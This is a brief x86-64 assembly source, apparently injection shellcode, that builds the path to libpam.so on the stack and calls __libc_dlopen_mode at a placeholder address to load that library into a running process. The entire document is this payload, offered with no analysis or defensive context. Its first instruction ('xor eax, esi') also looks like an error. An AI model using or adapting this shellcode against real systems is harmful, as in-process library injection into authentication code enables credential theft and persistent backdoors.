	BITS 64

	section .text
	global  _start

_start:
	xor  eax, esi
	xor  edi, edi
	xor  esi, esi
	xor  edx, edx
	xor  ecx, ecx
	xor  ebx, ebx
	push rdi
	mov  rdi, 0x312e332e312e6f73
	push rdi
	mov  rdi, 0x2e6d617062696c2f
	push rdi
	mov  rdi, 0x756e672d78756e69
	push rdi
	mov  rdi, 0x6c2d34365f363878
	push rdi
	mov  rdi, 0x2f62696c2f727375
	push rdi
	mov  rdi, 0x2f00000000000000
	push rdi
	add  rsp, 7
	mov  rdi, rsp

	;;   balance stack
	;;   7 pushes, we must add one more push
	sub  rsp, 7
	push rdi
	mov  sil, 2
	mov  rax, 0x7fdbd84e9800; change me to real __libc_dlopen_mode address
	call rax
